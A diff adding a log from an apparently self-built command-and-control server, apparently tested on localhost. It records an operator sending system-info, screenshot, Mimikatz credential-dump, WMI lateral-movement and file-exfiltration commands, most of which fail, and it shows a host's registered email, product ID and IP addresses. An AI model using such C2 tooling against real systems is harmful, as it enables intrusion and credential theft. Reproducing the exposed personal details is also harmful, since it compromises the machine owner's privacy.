@@ -1,0 +1,241 @@
+[2025-05-07 21:50:30] C2 server started on 0.0.0.0:4444
+[2025-05-07 21:53:53] Connected clients:
+[2025-05-07 21:53:55] Connected clients:
+[2025-05-07 21:54:19] Connected clients:
+[2025-05-07 21:54:19] No clients connected!
+[2025-05-07 21:54:21] Connected clients:
+[2025-05-07 21:59:08] New connection from ('127.0.0.1', 54556)
+[2025-05-07 21:59:12] Connected clients:
+[2025-05-07 21:59:14] Connected clients:
+[2025-05-07 21:59:17] Connected clients:
+[2025-05-07 22:01:17] Invalid selection!
+[2025-05-07 22:01:45] Shutting down C2 server...
+[2025-05-07 22:01:48] C2 server started on 0.0.0.0:4444
+[2025-05-07 22:01:51] New connection from ('127.0.0.1', 54564)
+[2025-05-07 22:01:54] Connected clients:
+[2025-05-07 22:01:55] Invalid selection!
+[2025-05-07 22:01:56] Connected clients:
+[2025-05-07 22:01:59] [('127.0.0.1', 54564)] Command output:
+
+RUBRIQUE
+    Système d'aide de Windows PowerShell
+
+DESCRIPTION COURTE
+    Affiche l'aide sur les applets de commande et les concepts de Windows PowerShell. 
+
+DESCRIPTION LONGUE
+    L'aide de Windows PowerShell décrit les applets de commande,
+    les fonctions, les scripts et les modules Windows PowerShell. Elle explique
+    les concepts tels que les éléments du langage Windows PowerShell.
+
+    Windows PowerShell ne contient pas de fichiers d'aide, mais vous pouvez consulter
+    les rubriques d'aide en ligne ou utiliser l'applet de commande Update-Help pour télécharger les fichiers d'aide
+    sur votre ordinateur. Utilisez ensuite l'applet de commande Get-Help pour afficher les rubriques
+    d'aide sur la ligne de commande.
+
+    Vous pouvez également utiliser l'applet de commande Update-Help pour télécharger les fichiers d'aide mis à jour
+    dès qu'ils sont disponibles, de sorte que le contenu de votre aide locale n'est jamais obsolète. 
+
+    Sans les fichiers d'aide, Get-Help affiche l'a
+[2025-05-07 22:01:59] [('127.0.0.1', 54564)] Command output:
+ide générée automatiquement pour les applets de commande, 
+    les fonctions et les scripts.
+
+
+  AIDE EN LIGNE    
+    Vous pouvez trouver de l'aide en ligne sur Windows PowerShell dans la bibliothèque TechNet
+    à l'adresse suivante : http://go.microsoft.com/fwlink/?LinkID=108518. 
+
+    Pour ouvrir l'aide en ligne d'une applet de commande ou d'une fonction, tapez :
+
+        Get-Help <nom-applet_commande> -Online    
+
+  UPDATE-HELP
+    Pour télécharger et installer des fichiers d'aide sur votre ordinateur :
+
+       1. Démarrez Windows PowerShell à l'aide de l'option Exécuter en tant qu'administrateur.
+       2. Tapez :
+
+          Update-Help
+
+    Une fois les fichiers d'aide installés, vous pouvez utiliser l'applet de commande Get-Help pour
+    afficher les rubriques d'aide. Vous pouvez également utiliser l'applet de commande Update-Help pour
+    télécharger les fichiers d'aide mis à jour afin que vos fichiers d'aide locaux restent
+    à jour.
+    
+    Pour plus d'informations sur l'applet de commande Update-Help, tapez :
+
+       Get-Help Update-Help -Online
+
+    ou accédez à l'adresse suivante : http://go.microsoft.com/fwlink/?LinkID=210614
+
+
+  GET-HELP
+    L'applet de commande Get-Help affiche l'aide sur la ligne de commande à partir du contenu
+    des fichiers d'aide de votre ordinateur. Sans les fichiers d'aide, Get-Help affiche une aide de base
+    relative aux applets de commande et aux fonctions. Vous pouvez également utiliser Get-Help pour afficher
+    une aide en ligne relative aux applets de commande et aux fonctions.
+
+    Pour obtenir de l'aide sur une applet de commande, tapez :
+
+        Get-Help <nom-applet_commande>
+    
+    Pour obtenir de l'aide en ligne, tapez :
+   
+        Get-Help <nom-applet_commande> -Online    
+
+    Les titres des rubriques conceptuelles commencent par « About_ ».
+    Pour obtenir de l'aide sur un concept ou un élément de langage, tapez :
+
+        Get-Help About_ <nom-rubrique>
+
+    Pour rechercher un mot ou une expression dans l'ensemble des fichiers d'aide, tapez :
+
+        Get-Help <terme-recherché>
+
+    Pour plus d'informations sur l'applet de commande Get-Help, tapez :
+
+        Get-Help Get-Help -Online
+
+    ou accédez à l'adresse suivante : http://go.microsoft.com/fwlink/?LinkID=113316
+
+
+  EXEMPLES :
+      Save-Help              : télécharge les fichiers d'aide à partir d'Internet et les enregistre
+                               sur un partage de fichiers.
+      Update-Help            : télécharge et installe les fichiers d'aide à partir
+                               d'Internet ou d'un partage de fichiers.
+      Get-Help Get-Process   : affiche l'aide relative à l'applet de commande Get-Process.   
+      Get-Help Get-Process -Online
+                             : ouvre l'aide en ligne relative à l'applet de commande Get-Process.
+      Help Get-Process       : affiche l'aide relative à Get-Process page par page.
+      Get-Process -?         : affiche l'aide relative à l'applet de commande Get-Process.      
+      Get-Help About_Modules : affiche l'aide relative aux modules Windows PowerShell.
+      Get-Help remoting      : recherche le mot « remoting » dans les rubriques d'aide.
+
+  VOIR AUSSI :
+      about_Updatable_Help
+      Get-Help
+      Save-Help
+      Update-Help
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+[2025-05-07 22:05:20] Invalid selection!
+[2025-05-07 22:05:21] Shutting down C2 server...
+[2025-05-07 22:05:27] C2 server started on 0.0.0.0:4444
+[2025-05-07 22:05:31] New connection from ('127.0.0.1', 54645)
+[2025-05-07 22:05:34] Connected clients:
+[2025-05-07 22:05:39] Sending 'System Info' to ('127.0.0.1', 54645)
+[2025-05-07 22:05:43] [('127.0.0.1', 54645)] Command output:
+
+Nom de l'hôte:                              AWIZZ
+Nom du système d'exploitation:              Microsoft Windows 11 Professionnel
+Version du système:                         10.0.22631 N/A build 22631
+Fabricant du système d'exploitation:        Microsoft Corporation
+Configuration du système d'exploitation:    Station de travail autonome
+Type de build du système d'exploitation:    Multiprocessor Free
+Propriétaire enregistré:                    ruben.penalvez@gmail.com
+Organisation enregistrée:                   N/A
+Identificateur de produit:                  00330-80000-00000-AA284
+Date d'installation originale:              06/03/2024, 15:57:52
+Heure de démarrage du système:              07/05/2025, 10:08:34
+Fabricant du système:                       BIOSTAR Group
+Modèle du système:                          H310MHP
+Type du système:                            x64-based PC
+Processeur(s):                              1 processeur(s) installé(s).
+                                            [01] :
+[2025-05-07 22:05:43] [('127.0.0.1', 54645)] Command output:
+ Intel64 Family 6 Model 158 Stepping 11 GenuineIntel ~3600 MHz
+Version du BIOS:                            American Megatrends Inc. 5.12, 30/12/2019
+Répertoire Windows:                         C:\WINDOWS
+Répertoire système:                         C:\WINDOWS\system32
+Périphérique d'amorçage:                    \Device\HarddiskVolume3
+Option régionale du système:                fr;Français (France)
+Paramètres régionaux d'entrée:              fr;Français (France)
+Fuseau horaire:                             (UTC+01:00) Bruxelles, Copenhague, Madrid, Paris
+Mémoire physique totale:                    16 346 Mo
+Mémoire physique disponible:                5 635 Mo
+Mémoire virtuelle : taille maximale:        19 290 Mo
+Mémoire virtuelle : disponible:             5 166 Mo
+Mémoire virtuelle : en cours d'utilisation: 14 124 Mo
+Emplacements des fichiers d'échange:        C:\pagefile.sys
+Domaine:                                    WORKGROUP
+Serveur d'ouverture de session:             \\AWIZZ
+Correctif(s):                               6 Corrections installées.
+                                            [01]: KB5054980
+                                            [02]: KB5012170
+                                            [03]: KB5027397
+                                            [04]: KB5036212
+                                            [05]: KB5055528
+                                            [06]: KB5053665
+Carte(s) réseau:                            2 carte(s) réseau installée(s).
+                                            [01]: Realtek PCIe GbE Family Controller
+                                                  Nom de la connexion : Ethernet
+                                                  DHCP activé :         Oui
+                                                  Serveur DHCP :        192.168.1.1
+                                                  Adresse(s) IP
+                                                  [01]: 192.168.1.75
+                                                  [02]: fe80::362b:46fe:bfe2:e0a8
+                                            [02]: VirtualBox Host-Only Ethernet Adapter
+                                                  Nom de la connexion : Ethernet 2
+                                                  DHCP activé :         Non
+                                                  Adresse(s) IP
+                                                  [01]: 192.168.56.1
+                                                  [02]: fe80::9180:a1c0:626:64e9
+Configuration requise pour Hyper-V:         Extensions de mode du moniteur d'ordinateur virtuel : Oui
+                                            Virtualisation activée dans le microprogramme : Oui
+                                            Traduction d'adresse de second niveau : Oui
+                                            Prévention de l'exécution des données disponible : Oui
+
+
+[2025-05-07 22:06:17] Sending 'Screenshot' to ('127.0.0.1', 54645)
+[2025-05-07 22:06:17] [('127.0.0.1', 54645)] Command output:
+
+
+[2025-05-07 22:06:36] Sending 'Dump Passwords (Mimikatz)' to ('127.0.0.1', 54645)
+[2025-05-07 22:06:36] [('127.0.0.1', 54645)] Command output:
+[!] Error: Au caractère Ligne:1 : 1
++ Invoke-Mimikatz -DumpCreds
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~
+Ce script dont le contenu est malveillant a été bloqué par votre logiciel antivirus.
+
+
+[2025-05-07 22:06:49] Sending 'Lateral Movement (WMI)' to ('127.0.0.1', 54645)
+[2025-05-07 22:06:49] [('127.0.0.1', 54645)] Command output:
+[!] Error: Le terme « Invoke-WMIExec » n'est pas reconnu comme nom d'applet de commande, fonction, fichier de script ou programme exécutable. Vérifiez l'orthographe du nom, ou si un chemin d'accès existe, vérifiez que le chemin d'accès est correct et réessayez.
+
+
+[2025-05-07 22:06:53] Sending 'Exfiltrate Files' to ('127.0.0.1', 54645)
+[2025-05-07 22:06:54] [('127.0.0.1', 54645)] Command output:
+[!] Error: Le chemin d'accès C:\sensitive\* n'existe pas ou n'est pas un chemin d'accès au système de fichiers valide.
+
+
+[2025-05-07 22:07:50] Client ('127.0.0.1', 54645) disconnected
+[2025-05-07 22:08:07] New connection from ('127.0.0.1', 54792)
+[2025-05-07 22:09:53] Connected clients:
+[2025-05-07 22:10:04] Sending 'Dump Passwords (Mimikatz)' to ('127.0.0.1', 54792)
+[2025-05-07 22:10:04] [('127.0.0.1', 54792)] Command output:
+[!] Error: Le terme « Invoke-Mimikatz » n'est pas reconnu comme nom d'applet de commande, fonction, fichier de script ou programme exécutable. Vérifiez l'orthographe du nom, ou si un chemin d'accès existe, vérifiez que le chemin d'accès est correct et réessayez.
+
+
+[2025-05-07 22:10:26] Sending 'Exfiltrate Files' to ('127.0.0.1', 54792)
+[2025-05-07 22:10:26] [('127.0.0.1', 54792)] Command output:
+[!] Error: Le chemin d'accès C:\sensitive\* n'existe pas ou n'est pas un chemin d'accès au système de fichiers valide.
+
+
+[2025-05-07 22:13:39] Invalid selection!
+[2025-05-07 22:13:40] Shutting down C2 server...
